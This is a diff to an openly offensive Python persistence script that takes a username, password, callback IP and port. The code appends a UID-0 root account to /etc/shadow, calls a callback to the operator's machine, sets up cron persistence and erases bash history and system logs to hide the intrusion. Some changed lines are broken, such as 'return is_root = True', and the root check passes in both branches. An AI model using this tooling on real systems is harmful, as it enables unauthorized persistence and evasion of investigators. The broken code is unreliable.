@@ -11,11 +11,11 @@ import argparse
 
 
 parser = argparse.ArgumentParser(description="script for adding new root user and creating callback to local machine\nusage: pers.py -u 'pepe' -p 'password' 10.0.0.1 4444")
-parser.add_argument("-u", "--user", help="username for new root user", required="True")
-parser.add_argument("-p", "--password", help="password for new root user", required="True")
-parser.add_argument("-f", "--force", help="force bypass of root permissions check", required="False", action="store_true")
-parser.add_argument("ip", help="local ip for callback", required="True")
-parser.add_argument("port", help="local port for callback", required="True")
+parser.add_argument("-u", "--user", help="username for new root user", required=True)
+parser.add_argument("-p", "--password", help="password for new root user", required=True)
+parser.add_argument("-f", "--force", help="force bypass of root permissions check", required=False, action="store_true")
+parser.add_argument("ip", help="local ip for callback")
+parser.add_argument("port", help="local port for callback")
 args = parser.parse_args()
 username = args.user
 password = args.password
@@ -45,11 +45,10 @@ print("perms = {}".format(perms))
 is_root = None
 def perm_check(perms, is_root):
 	if perms == "root":
-		is_root = True
+		return is_root = True
 	else:
-		is_root = True
+		return is_root = True
 		print("\n*** error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check ***")
-	return is_root
 
 
 # call function to check for root permissions
@@ -57,12 +56,12 @@ perm_check(perms, is_root)
 
 
 # add user with root perms
-def add_user(username):
+def add_user(username,password):
 	if username:
 		print("establishing persistence...")
 		os.system("openssl passwd -6 {} > /tmp/.backups/passwd.txt".format(password))
 		f = open("/tmp/.backups/passwd.txt", "r")
-		new_user_pass = f.read()
+		new_user_pass = f.read().strip()
 		os.system("echo '{}:{}:0:0:root:/{}:/bin/bash' >> /etc/shadow".format(username,new_user_pass,username))
 		print("user {} added".format(username))
 		f.close()
@@ -107,7 +106,7 @@ def clear_tracks():
 	os.system("echo ' ' > ~/.bash_history")
 	os.system("echo ' ' > /root/.bash_history")
 
-		# placing old contents back into logs
+	# placing old contents back into logs
 	os.system("echo /tmp/.backups/auth.log > /var/log/auth.log")
 	os.system("echo /tmp/.backups/cron.log > /var/log/cron.log")
 	os.system("echo /tmp/.backups/maillog > /var/log/maillog")
@@ -124,7 +123,7 @@ def clear_tracks():
 # call functions
 if is_root or args.force:
 	disable_hist()
-	add_user(username)
+	add_user(username, password)
 	callback(local_ip, local_port, username)
 	cron_make()
 	clear_tracks()
